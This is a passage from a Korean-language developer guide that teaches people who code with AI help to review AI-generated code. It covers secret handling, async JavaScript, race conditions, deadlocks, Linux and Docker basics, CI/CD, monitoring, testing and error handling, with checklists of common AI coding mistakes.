# .env 파일 (절대 git에 올리지 마라)
DATABASE_URL=postgres://user:password@localhost:5432/mydb
JWT_SECRET=super-secret-key-here
API_KEY=sk-1234567890

# .gitignore에 반드시 추가
.env
.env.local
.env.production
```

```javascript
// 코드에서 사용
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret) throw new Error('JWT_SECRET is not set');  // 없으면 앱 시작 실패
```

## AI가 자주 틀리는 것

- [ ] SQL 쿼리를 문자열 조합으로 만듦 (Injection 취약)
- [ ] 비밀번호를 SHA256이나 MD5로 해싱
- [ ] API 키를 코드에 하드코딩
- [ ] 입력 검증을 클라이언트에서만 수행
- [ ] CORS를 `*`로 열고, 보안 헤더 설정 없음
- [ ] `dangerouslySetInnerHTML` 사용을 아무렇지 않게 제안
- [ ] admin 엔드포인트에 인가 체크 없음
- [ ] 에러 메시지에 스택 트레이스나 DB 정보 노출

---

# 5. 동시성과 비동기 `[중급~심화]`

바이브코딩으로 **가장 잡기 어려운 버그**가 여기서 나온다.
재현이 안 되고, 코드만 봐서는 안 보이고, 프로덕션에서만 터진다.

---

## 5.1 프로세스와 스레드

### 프로세스 (Process)

- 실행 중인 프로그램의 인스턴스
- 독립된 메모리 공간을 가짐
- 프로세스끼리 직접 메모리 공유 불가

### 스레드 (Thread)

- 프로세스 안에서 실행되는 작업 단위
- 같은 프로세스의 스레드끼리 메모리 공유
- 메모리 공유 = 빠르지만, 동시 접근 문제 발생

```
[프로세스 A]                    [프로세스 B]
  ├── 스레드 1  ─┐                ├── 스레드 1
  ├── 스레드 2  ─┤ 메모리 공유     └── 스레드 2
  └── 스레드 3  ─┘
  (서로의 메모리에 접근 가능)     (A의 메모리에 접근 불가)
```

## 5.2 JavaScript의 비동기 모델

JS는 **싱글 스레드**다. 한 번에 하나만 실행한다.
그런데 어떻게 비동기 작업(API 호출, 파일 읽기)이 가능한가?

### Event Loop

```
[Call Stack]       [Web APIs / Node APIs]       [Task Queue]
     |                                              |
  코드 실행 ────→  setTimeout, fetch 등 ────→   콜백 대기
     |              (백그라운드에서 처리)            |
     ↑                                              |
     └──────────── Event Loop가 옮겨줌 ←────────────┘
                  (Call Stack이 비었을 때만)
```

```javascript
console.log('1');

setTimeout(() => console.log('2'), 0);  // 0ms여도 나중에 실행!

Promise.resolve().then(() => console.log('3'));

console.log('4');

// 출력 순서: 1, 4, 3, 2
// 왜? 동기코드(1,4) → 마이크로태스크(Promise=3) → 매크로태스크(setTimeout=2)
```

### 마이크로태스크 vs 매크로태스크

```
마이크로태스크 (우선순위 높음):
  - Promise.then/catch/finally
  - MutationObserver
  - queueMicrotask()

매크로태스크 (우선순위 낮음):
  - setTimeout, setInterval
  - I/O 작업
  - setImmediate (Node.js)
```

### async/await

```javascript
// 콜백 지옥
getUser(1, (user) => {
    getPosts(user.id, (posts) => {
        getComments(posts[0].id, (comments) => {
            console.log(comments);
        });
    });
});

// Promise
getUser(1)
    .then(user => getPosts(user.id))
    .then(posts => getComments(posts[0].id))
    .then(comments => console.log(comments))
    .catch(err => console.error(err));

// async/await (가장 읽기 쉬움)
async function main() {
    try {
        const user = await getUser(1);
        const posts = await getPosts(user.id);
        const comments = await getComments(posts[0].id);
        console.log(comments);
    } catch (err) {
        console.error(err);
    }
}
```

### 병렬 실행

```javascript
// 순차 실행 (느림 - 총 3초)
const users = await getUsers();     // 1초
const posts = await getPosts();     // 1초
const tags = await getTags();       // 1초

// 병렬 실행 (빠름 - 총 1초)
const [users, posts, tags] = await Promise.all([
    getUsers(),   // 1초
    getPosts(),   // 1초  ← 동시에
    getTags()     // 1초
]);

// 하나라도 실패하면 전체 실패하는 게 싫다면:
const results = await Promise.allSettled([
    getUsers(),
    getPosts(),
    getTags()
]);
// results[0] = { status: 'fulfilled', value: [...] }
// results[1] = { status: 'rejected', reason: Error }
```

## 5.3 Race Condition

두 작업이 공유 자원에 동시에 접근해서 예상치 못한 결과가 나오는 것.

### 실제 사례: 중복 결제

```
시각 T1: 사용자가 결제 버튼을 빠르게 2번 클릭

요청A: 재고 확인 → 1개 남음 → 결제 처리 → 재고 0으로 변경
요청B: 재고 확인 → 1개 남음 → 결제 처리 → 재고 0으로 변경
                    ↑ 요청A가 변경하기 전에 읽어서 1개로 보임

결과: 재고 1개인데 2번 판매됨
```

### 해결 방법

```sql
-- 1. 비관적 락 (Pessimistic Lock)
-- 읽을 때부터 잠근다 = 다른 트랜잭션은 대기
SELECT * FROM products WHERE id = 1 FOR UPDATE;
-- → 다른 트랜잭션은 이 행을 읽지도 못하고 대기

-- 2. 낙관적 락 (Optimistic Lock)
-- 읽을 때 버전을 기록하고, 수정 시 버전이 변했는지 확인
UPDATE products
SET stock = stock - 1, version = version + 1
WHERE id = 1 AND version = 5;
-- → 영향받은 행이 0이면 = 누군가 먼저 수정함 → 재시도

-- 3. 원자적 연산
-- 읽기+쓰기를 한 번에
UPDATE products SET stock = stock - 1
WHERE id = 1 AND stock > 0;
-- → DB가 원자적으로 처리, 재고가 음수가 될 수 없음
```

```javascript
// 프론트엔드 방어: 버튼 중복 클릭 방지
const [isSubmitting, setIsSubmitting] = useState(false);

async function handlePurchase() {
    if (isSubmitting) return;  // 이미 처리 중이면 무시
    setIsSubmitting(true);
    try {
        await purchaseItem();
    } finally {
        setIsSubmitting(false);
    }
}
```

## 5.4 데드락

두 작업이 서로의 자원을 기다리며 영원히 멈추는 상태.

```
트랜잭션A: 계좌1 잠금 → 계좌2 잠금 시도 (대기...)
트랜잭션B: 계좌2 잠금 → 계좌1 잠금 시도 (대기...)
→ 둘 다 영원히 대기 = 데드락
```

### 데드락 발생 4조건 (전부 충족해야 발생)

1. **상호 배제**: 자원을 한 번에 하나만 사용
2. **점유와 대기**: 자원을 가진 채로 다른 자원을 기다림
3. **비선점**: 이미 할당된 자원을 강제로 뺏을 수 없음
4. **순환 대기**: A→B→C→A 순환적으로 대기

### 예방

```sql
-- 항상 같은 순서로 자원에 접근
-- 나쁜 예: 트랜잭션마다 순서가 다름
-- 좋은 예: 항상 ID가 작은 것부터 잠금

-- 계좌이체 시 항상 ID가 작은 계좌부터 잠금
BEGIN;
SELECT * FROM accounts WHERE id = LEAST(1, 2) FOR UPDATE;
SELECT * FROM accounts WHERE id = GREATEST(1, 2) FOR UPDATE;
-- 이체 처리
COMMIT;
```

## AI가 자주 틀리는 것

- [ ] `await`을 순차적으로만 사용 (병렬 가능한 것도)
- [ ] Race condition 방어 없이 재고/포인트 차감 로직 생성
- [ ] 데드락 가능성이 있는 트랜잭션 순서
- [ ] `Promise.all` 에러 핸들링 미비
- [ ] 프론트엔드에서 중복 요청 방지 없음

---

# 6. 인프라 `[중급]`

코드를 짜는 건 AI가 해줘도, 세상에 내보내는 건 사람이 해야 한다.

---

## 6.1 리눅스 기초

대부분의 서버는 Linux에서 돌아간다. 최소한 이것만 알아라.

### 자주 쓰는 명령어

```bash
# 파일/디렉토리
ls -la              # 파일 목록 (숨김 파일 포함, 상세 정보)
cd /path/to/dir     # 디렉토리 이동
mkdir -p a/b/c      # 디렉토리 생성 (중간 경로 자동 생성)
cp -r src dest      # 복사 (-r: 디렉토리 재귀)
mv old new          # 이동/이름변경
rm -rf dir          # 삭제 (조심! 되돌릴 수 없음)

# 파일 내용
cat file.txt        # 전체 출력
head -n 20 file     # 처음 20줄
tail -f log.txt     # 실시간 로그 모니터링 (매우 유용)
grep "error" *.log  # 패턴 검색

# 프로세스
ps aux              # 실행 중인 프로세스 목록
kill -9 PID         # 프로세스 강제 종료
top / htop          # CPU, 메모리 실시간 모니터링

# 네트워크
curl -X GET url     # HTTP 요청
netstat -tlnp       # 열린 포트 확인
ping host           # 네트워크 연결 확인

# 권한
chmod 755 file      # rwxr-xr-x (소유자: 읽기쓰기실행, 그룹/기타: 읽기실행)
chown user:group f  # 소유자 변경
```

### 권한 읽는 법

```
-rwxr-xr-x
│├─┤├─┤├─┤
│ │   │   └── 기타 사용자: r-x (읽기, 실행)
│ │   └────── 그룹: r-x (읽기, 실행)
│ └────────── 소유자: rwx (읽기, 쓰기, 실행)
└──────────── - 파일 / d 디렉토리

숫자로: r=4, w=2, x=1
755 = rwx(7) r-x(5) r-x(5)
644 = rw-(6) r--(4) r--(4)
```

## 6.2 Docker

"내 컴에서는 되는데요"를 근본적으로 해결하는 도구.
앱 + 실행 환경을 하나의 패키지(컨테이너)로 만든다.

### 핵심 개념

```
이미지(Image): 실행 환경의 스냅샷. 레시피.
컨테이너(Container): 이미지를 실행한 인스턴스. 실제 요리.
Dockerfile: 이미지를 만드는 설계도.
Docker Compose: 여러 컨테이너를 한 번에 관리.
```

### Dockerfile 작성

```dockerfile
# Node.js 앱 예시
FROM node:20-alpine          # 기반 이미지 (Alpine = 경량 Linux)

WORKDIR /app                 # 작업 디렉토리 설정

COPY package*.json ./        # 의존성 파일 먼저 복사
RUN npm ci --production      # 의존성 설치 (캐시 활용을 위해 분리)

COPY . .                     # 소스코드 복사

EXPOSE 3000                  # 포트 문서화 (실제 바인딩은 docker run에서)

CMD ["node", "server.js"]    # 컨테이너 시작 시 실행할 명령
```

**레이어 캐시**: Dockerfile의 각 줄은 레이어. 변경된 줄 이후만 다시 빌드.
→ 자주 변하지 않는 것(의존성)을 위에, 자주 변하는 것(소스코드)을 아래에.

### Docker Compose

```yaml
# docker-compose.yml (version 키는 Compose V2에서 불필요)
services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://user:pass@db:5432/mydb
    depends_on:
      db:
        condition: service_healthy  # DB가 준비된 후 시작
      redis:
        condition: service_started

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass      # 실무에서는 시크릿 매니저 사용
      POSTGRES_DB: mydb
    volumes:
      - pgdata:/var/lib/postgresql/data  # 데이터 영속화
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d mydb"]
      interval: 5s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"

volumes:
  pgdata:
```

```bash
docker compose up -d     # 백그라운드 실행
docker compose down      # 중지 및 제거
docker compose logs -f   # 실시간 로그
```

## 6.3 CI/CD

코드를 푸시하면 자동으로 테스트 → 빌드 → 배포까지 해주는 파이프라인.

### CI (Continuous Integration)

```
코드 푸시 → 린트 검사 → 단위 테스트 → 빌드 → 통합 테스트
           자동으로 실행. 실패하면 머지 차단.
```

### CD (Continuous Deployment)

```
CI 통과 → 스테이징 배포 → (승인) → 프로덕션 배포
```

### GitHub Actions 예시

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build
```

### 배포 전략

```
Rolling Update (순차 배포):
  서버 4대 중 1대씩 교체. 다운타임 없음. 잠시 구/신버전 공존.

Blue-Green:
  [Blue: 현재 버전] ← 트래픽
  [Green: 새 버전] (대기)
  확인 후 트래픽을 Green으로 전환.
  문제 시 Blue로 즉시 롤백.

Canary:
  새 버전을 전체의 5%에만 적용.
  문제 없으면 점진적으로 100%까지 확대.
  가장 안전하지만 모니터링 필수.
```

## 6.4 클라우드 핵심 서비스

모든 걸 다 알 필요 없다. 이것만 알면 왠만한 서비스를 배포할 수 있다.

### AWS 기준

```
컴퓨팅:
  EC2         — 가상 서버 (직접 관리)
  ECS/EKS     — 컨테이너 오케스트레이션
  Lambda      — 서버리스 함수 (요청당 과금)

스토리지:
  S3          — 파일 저장 (이미지, 동영상, 정적 파일)
  EBS         — EC2에 붙이는 디스크

데이터베이스:
  RDS         — 관리형 관계형 DB (MySQL, PostgreSQL)
  ElastiCache — 관리형 Redis
  DynamoDB    — 관리형 NoSQL

네트워크:
  Route 53    — DNS
  CloudFront  — CDN
  ALB/NLB     — 로드밸런서
  VPC         — 가상 사설 네트워크
```

### 서버리스 vs 컨테이너

```
서버리스 (Lambda):
  + 서버 관리 불필요, 사용한 만큼만 과금
  + 자동 확장
  - 콜드스타트 (첫 요청 지연)
  - 실행 시간 제한 (15분)
  → 적합: 이벤트 처리, 간단한 API, 크론 작업

컨테이너 (ECS/EKS):
  + 완전한 제어
  + 콜드스타트 없음
  - 서버 관리 필요
  → 적합: 항상 실행되어야 하는 서비스, 복잡한 앱
```

## 6.5 모니터링

배포 후가 진짜 시작이다. 문제를 빨리 발견하고 빨리 대응하는 것이 핵심.

### 로그의 3단계

```
1. 수집: 앱에서 로그를 구조화하여 출력
   console.log('user created')                    ← 나쁜 예
   logger.info('user created', { userId, email }) ← 좋은 예 (구조화)

2. 저장: 중앙 집중 로그 시스템에 모음
   → ELK Stack (Elasticsearch + Logstash + Kibana)
   → AWS CloudWatch Logs
   → Datadog

3. 분석: 검색, 대시보드, 알림 설정
   → "error" 로그가 분당 10건 이상이면 슬랙 알림
```

### 핵심 메트릭

```
서버:
  - CPU 사용률, 메모리 사용률
  - 디스크 사용량
  - 네트워크 I/O

앱:
  - 응답 시간 (p50, p95, p99)
  - 에러율 (5xx / 전체 요청)
  - 처리량 (RPS: Requests Per Second)

비즈니스:
  - 회원가입 수, 결제 성공률
  - DAU/MAU
```

### 알럿 설계 원칙

```
- 에러율 > 5% 지속 5분 → 슬랙 경고
- 에러율 > 20% 지속 1분 → 전화 알림
- 응답시간 p99 > 3초 지속 10분 → 슬랙 경고
- 디스크 사용률 > 85% → 슬랙 경고

주의: 알럿 피로(Alert Fatigue) 방지
  → 진짜 대응이 필요한 것만 알림
  → "정보용"은 대시보드에만 표시
```

## AI가 자주 틀리는 것

- [ ] Dockerfile에서 레이어 캐시를 고려하지 않는 구조
- [ ] 환경 변수 대신 설정값을 코드에 하드코딩
- [ ] 로그를 console.log로만 처리 (구조화 없음)
- [ ] 헬스체크 엔드포인트 없이 배포
- [ ] `.dockerignore` 없이 node_modules까지 복사
- [ ] 프로덕션에서 `npm install` (대신 `npm ci` 사용해야)

---

# 7. 테스트 `[기초~중급]`

바이브코딩에서 테스트는 **AI가 만든 코드가 진짜 동작하는지 확인하는 유일한 방법**이다.

---

## 7.1 왜 테스트가 필요한가

AI가 만든 코드는 "돌아가는 것처럼 보이는" 코드다.
테스트 없이는 경계값, 에러 케이스, 동시성 문제를 발견할 수 없다.

```
테스트 없는 바이브코딩:
  AI에게 "결제 기능 만들어줘" → 코드 받음 → 대충 눌러봄 → "되네!" → 배포
  → 한 달 뒤: 0원 결제, 중복 결제, 환불 안 됨

테스트 있는 바이브코딩:
  AI에게 "결제 기능 만들어줘" → 코드 받음 → 테스트 추가 → 경계값 발견
  → AI에게 "이 케이스 처리해줘" → 수정 → 안전하게 배포
```

## 7.2 테스트의 종류

```
        /\
       /  \        E2E 테스트
      /    \       (전체 흐름, 느림, 적게)
     /──────\
    /        \     통합 테스트
   /          \    (모듈 간 연결, 중간)
  /────────────\
 /              \  단위 테스트
/________________\ (함수/클래스 단위, 빠름, 많이)

테스트 피라미드: 아래로 갈수록 많이, 위로 갈수록 적게
```

### 단위 테스트 (Unit Test) `[기초]`

함수 하나가 기대대로 동작하는지 확인.

```javascript
// 테스트 대상
function calculateTax(price, taxRate) {
    if (price < 0) throw new Error('가격은 음수일 수 없습니다');
    return Math.round(price * taxRate);
}

// 테스트 (Jest/Vitest)
describe('calculateTax', () => {
    test('정상 계산', () => {
        expect(calculateTax(1000, 0.1)).toBe(100);
    });

    test('0원', () => {
        expect(calculateTax(0, 0.1)).toBe(0);
    });

    test('음수 가격 → 에러', () => {
        expect(() => calculateTax(-1000, 0.1)).toThrow('음수');
    });
});
```

### 통합 테스트 (Integration Test) `[중급]`

여러 모듈이 연결될 때 동작하는지 확인. DB, API 호출 포함.

```javascript
// API 엔드포인트 통합 테스트
describe('POST /api/users', () => {
    test('유저 생성 성공', async () => {
        const res = await request(app)
            .post('/api/users')
            .send({ name: '홍길동', email: 'hong@test.com' });

        expect(res.status).toBe(201);
        expect(res.body.name).toBe('홍길동');

        // DB에도 실제로 저장되었는지 확인
        const user = await db.users.findByEmail('hong@test.com');
        expect(user).not.toBeNull();
    });

    test('중복 이메일 → 409 Conflict', async () => {
        // 먼저 하나 생성
        await request(app)
            .post('/api/users')
            .send({ name: '홍길동', email: 'hong@test.com' });

        // 같은 이메일로 다시 시도
        const res = await request(app)
            .post('/api/users')
            .send({ name: '김영희', email: 'hong@test.com' });

        expect(res.status).toBe(409);
    });
});
```

### E2E 테스트 (End-to-End) `[심화]`

사용자의 실제 행동을 시뮬레이션. 브라우저 자동화.

```javascript
// Playwright 예시
test('로그인 후 대시보드 접근', async ({ page }) => {
    await page.goto('/login');
    await page.fill('#email', 'hong@test.com');
    await page.fill('#password', 'password123');
    await page.click('button[type="submit"]');

    await expect(page).toHaveURL('/dashboard');
    await expect(page.locator('h1')).toContainText('환영합니다');
});
```

## 7.3 테스트 작성 패턴

### AAA 패턴

```javascript
test('장바구니에 상품 추가', () => {
    // Arrange (준비)
    const cart = createCart();
    const item = { name: '키보드', price: 50000 };

    // Act (실행)
    cart.add(item);

    // Assert (검증)
    expect(cart.getTotal()).toBe(50000);
    expect(cart.getItems()).toHaveLength(1);
});
```

### 무엇을 테스트할 것인가 — 우선순위

```
1순위: 돈이 걸린 로직 (결제, 포인트, 할인)
2순위: 입력 검증 (이메일, 비밀번호 규칙, 파일 업로드)
3순위: 비즈니스 규칙 (권한 체크, 상태 전이)
4순위: 경계값 (0, 음수, 빈 문자열, null, 매우 큰 수)
```

### 모킹 (Mocking) `[중급]`

외부 의존성(DB, API, 이메일)을 가짜로 대체하여 테스트.

```javascript
// 실제 이메일을 보내지 않고 테스트
const mockEmailService = {
    send: jest.fn().mockResolvedValue({ success: true })
};

test('회원가입 시 환영 이메일 발송', async () => {
    await registerUser(
        { name: '홍길동', email: 'hong@test.com' },
        mockEmailService
    );

    expect(mockEmailService.send).toHaveBeenCalledWith(
        expect.objectContaining({
            to: 'hong@test.com',
            subject: expect.stringContaining('환영')
        })
    );
});
```

## AI가 자주 틀리는 것

- [ ] 정상 케이스만 테스트하고 에러/경계값 케이스 누락
- [ ] 테스트 간 상태 공유 (한 테스트가 다른 테스트에 영향)
- [ ] 외부 서비스를 모킹하지 않고 실제 호출
- [ ] 비동기 테스트에서 await 누락 (항상 통과하는 가짜 성공)
- [ ] 테스트가 구현 세부사항에 의존 (리팩토링하면 깨짐)

---

# 8. 에러 핸들링 `[기초~중급]`

AI가 만든 코드에서 에러 처리는 거의 항상 부족하다.
"happy path"만 있고, 실패 시나리오가 없다.

---

## 8.1 에러 핸들링 원칙

```
1. 에러를 삼키지 마라 (빈 catch 금지)
2. 사용자에게는 친절하게, 로그에는 상세하게
3. 복구 가능한 에러와 불가능한 에러를 구분하라
4. 에러는 발생 지점에서 가장 가까운 곳에서 처리하라
```

## 8.2 JavaScript 에러 처리

### 기본 패턴

```javascript
// 나쁜 예: 빈 catch (에러를 삼킴)
try {
    await saveUser(data);
} catch (err) {
    // 아무것도 안 함 — 에러가 조용히 사라짐
}

// 나쁜 예: console.log만
try {
    await saveUser(data);
} catch (err) {
    console.log(err); // 프로덕션에서 누가 이걸 보는가?
}

// 좋은 예: 적절한 처리
try {
    await saveUser(data);
} catch (err) {
    logger.error('유저 저장 실패', { error: err.message, userId: data.id });

    if (err.code === 'DUPLICATE_EMAIL') {
        throw new ConflictError('이미 사용 중인 이메일입니다');
    }
    throw new InternalError('유저 생성에 실패했습니다');
}
```

### 커스텀 에러 클래스

```javascript
class AppError extends Error {
    constructor(message, statusCode, code) {
        super(message);
        this.statusCode = statusCode;
        this.code = code;
    }
}

class NotFoundError extends AppError {
    constructor(resource) {
        super(`${resource}을(를) 찾을 수 없습니다`, 404, 'NOT_FOUND');
    }
}

class ValidationError extends AppError {
    constructor(message) {
        super(message, 400, 'VALIDATION_ERROR');
    }
}

// 사용
async function getUser(id) {
    const user = await db.users.findById(id);
    if (!user) throw new NotFoundError('유저');
    return user;
}
```

### 글로벌 에러 핸들러 (Express)

```javascript
// 모든 라우터 뒤에 배치
app.use((err, req, res, next) => {
    // 로그: 상세 정보 (내부용)
    logger.error({
        message: err.message,
        stack: err.stack,
        path: req.path,
        method: req.method,
    });

    // 응답: 사용자에게는 안전한 메시지만
    const statusCode = err.statusCode || 500;
    res.status(statusCode).json({
        error: {
            code: err.code || 'INTERNAL_ERROR',
            message: statusCode === 500
                ? '서버 오류가 발생했습니다'  // 내부 에러는 상세 노출 금지
                : err.message,
        },
    });
});
```

## 8.3 일관된 에러 응답 형식

```json
// 성공
{
    "data": { "id": 1, "name": "홍길동" }
}

// 실패 — 항상 같은 구조
{
    "error": {
        "code": "VALIDATION_ERROR",
        "message": "이메일 형식이 올바르지 않습니다",
        "details": [
            { "field": "email", "message": "유효한 이메일을 입력하세요" }
        ]
    }
}
```

**절대 하면 안 되는 것**: 에러 응답에 스택 트레이스, SQL 쿼리, 파일 경로 노출.

## 8.4 비동기 에러 처리 주의점

```javascript
// 위험: unhandled promise rejection
app.get('/users/:id', async (req, res) => {
    const user = await getUser(req.params.id); // 여기서 에러나면?
    res.json(user); // → 응답 안 감, 클라이언트는 무한 대기
});

// 안전: try/catch 또는 에러 래퍼
app.get('/users/:id', async (req, res, next) => {
    try {
        const user = await getUser(req.params.id);
        res.json(user);
    } catch (err) {
        next(err); // 글로벌 에러 핸들러로 전달
    }
});

// 더 깔끔: 래퍼 함수
const asyncHandler = (fn) => (req, res, next) =>
    Promise.resolve(fn(req, res, next)).catch(next);

app.get('/users/:id', asyncHandler(async (req, res) => {
    const user = await getUser(req.params.id);
    res.json(user);
}));
```

## AI가 자주 틀리는 것

- [ ] 빈 catch 블록 (`catch (err) {}`)
- [ ] 에러 응답에 스택 트레이스 노출
- [ ] async 함수에서 try/catch 없이 await 사용
- [ ] 모든 에러에 500을 반환 (400, 404, 409 등 구분 없음)
- [ ] 에러 메시지가 하드코딩된 영어 (사용자 친화적이지 않음)
- [ ] 에러 로깅 없음 (console.log만 또는 아예 없음)

---

# 부록: 바이브코딩 실전 체크리스트

AI에게 코드를 받으면 아래를 확인하라.

## API 설계 체크

```
- [ ] RESTful 규칙을 따르는가? (URL 명사, 메서드 동사)
- [ ] 적절한 상태 코드를 반환하는가?
- [ ] 에러 응답 형식이 일관되는가?
- [ ] 페이지네이션이 있는가?
- [ ] 인증/인가가 필요한 엔드포인트에 적용되었는가?
```

## 데이터베이스 체크

```
- [ ] 적절한 인덱스가 설정되었는가?
- [ ] N+1 쿼리가 없는가?
- [ ] 트랜잭션이 필요한 곳에 트랜잭션이 있는가?
- [ ] 페이지네이션 방식이 대용량에 적합한가?
- [ ] 마이그레이션 파일이 있는가?
```

## 보안 체크

```
- [ ] SQL Injection 방어 (Parameterized Query)
- [ ] XSS 방어 (입력 이스케이프, CSP 헤더)
- [ ] 비밀번호가 bcrypt로 해싱되는가?
- [ ] API 키/시크릿이 환경변수에 있는가?
- [ ] 서버 측 입력 검증이 있는가?
- [ ] CORS 설정이 적절한가?
- [ ] Rate Limiting이 있는가?
```

## 성능 체크

```
- [ ] 불필요한 데이터를 과도하게 조회하지 않는가?
- [ ] 병렬 가능한 비동기 작업이 순차 실행되고 있지 않은가?
- [ ] 무거운 작업이 API 핸들러에서 동기적으로 실행되지 않는가?
- [ ] 캐시가 적절히 활용되고 있는가?
```

## 배포 체크

```
- [ ] 환경별(dev/staging/prod) 설정이 분리되어 있는가?
- [ ] 헬스체크 엔드포인트가 있는가?
- [ ] 로그가 구조화되어 있는가?
- [ ] 에러 모니터링이 설정되어 있는가?
- [ ] 롤백 전략이 있는가?
```

---

> 이 가이드의 목표는 "모든 것을 직접 구현하는 것"이 아니라,
> **AI가 만든 코드를 보고 "이건 문제가 있다"고 판단할 수 있는 눈**을 기르는 것이다.
